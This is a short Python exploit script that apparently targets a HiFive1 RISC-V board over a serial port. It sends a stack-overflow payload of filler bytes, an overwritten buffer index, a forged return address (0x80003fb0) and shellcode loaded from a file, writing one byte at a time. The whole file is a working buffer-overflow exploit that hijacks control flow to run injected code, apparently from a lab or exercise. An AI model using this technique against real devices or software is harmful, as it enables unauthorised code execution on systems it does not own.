#!/usr/bin/env python3

import time
import serial
READTIMEOUT = 0.1

hifive1 = serial.Serial("/dev/ttyUSB1", 9600, timeout=READTIMEOUT)

def slow_write(message):
    for i, c in enumerate(message):
        print(i, c)
        hifive1.write(c.to_bytes(1, byteorder='little'))
        time.sleep(0.01)

with open('shellcode.data', 'rb') as f:
    shellcode = f.read()

# Fill up buf, Set bufLoc to 15 (the correct/ current value) as we write over
# it, a bit more filler, then the return address (0x80003fb0), followed by
# out shellcode at that address.
message = b'ABCDEFGHIJLKMNO\x0fQRSTUVWXYZ12\xb0\x3f\x00\x80'
message += shellcode
slow_write(message)
